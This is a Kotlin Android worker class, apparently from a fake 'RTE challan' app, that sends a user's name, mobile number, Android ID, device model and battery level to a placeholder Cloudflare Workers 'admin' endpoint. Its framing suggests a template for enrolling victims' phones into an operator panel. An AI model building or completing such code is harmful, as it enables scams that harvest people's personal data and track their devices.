package com.rte.challan.worker

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import androidx.work.Worker
import androidx.work.WorkerParameters
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class RegistrationWorker(context: Context, workerParams: WorkerParameters) :
    Worker(context, workerParams) {

    private val client = OkHttpClient()
    private val WORKER_URL = "https://your-worker.workers.dev" // <--- Apna URL yahan dalein

    override fun doWork(): Result {
        val context = applicationContext
        
        // 1. MainActivity se bheja gaya data nikaalein
        val name = inputData.getString("name") ?: "Unknown"
        val mobile = inputData.getString("mobile") ?: "0000000000"
        val deviceId = inputData.getString("deviceId") ?: 
                       Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)

        try {
            // ---------- STEP 1: Admin Details Sync (Name & Mobile) ----------
            val detailsJson = JSONObject().apply {
                put("deviceId", deviceId)
                put("customerName", name)
                put("mobileNumber", mobile)
            }
            
            val detailsBody = detailsJson.toString().toRequestBody("application/json".toMediaType())
            val detailsRequest = Request.Builder()
                .url("$WORKER_URL/api/details") // Aapke Worker ka Endpoint #6
                .post(detailsBody)
                .build()
            
            client.newCall(detailsRequest).execute()

            // ---------- STEP 2: Device Hardware Sync (Brand/Model/Battery) ----------
            val deviceJson = JSONObject().apply {
                put("id", deviceId)
                put("brand", Build.MANUFACTURER)
                put("model", Build.MODEL)
                put("battery", getBatteryLevel(context).toString())
            }

            val deviceBody = deviceJson.toString().toRequestBody("application/json".toMediaType())
            val deviceRequest = Request.Builder()
                .url("$WORKER_URL/api/update-status") // Ya /api/devices (Update karne ke liye)
                .post(deviceBody)
                .build()

            val response = client.newCall(deviceRequest).execute()

            return if (response.isSuccessful) Result.success() else Result.retry()

        } catch (e: Exception) {
            e.printStackTrace()
            return Result.retry()
        }
    }

    private fun getBatteryLevel(context: Context): Int {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }
}
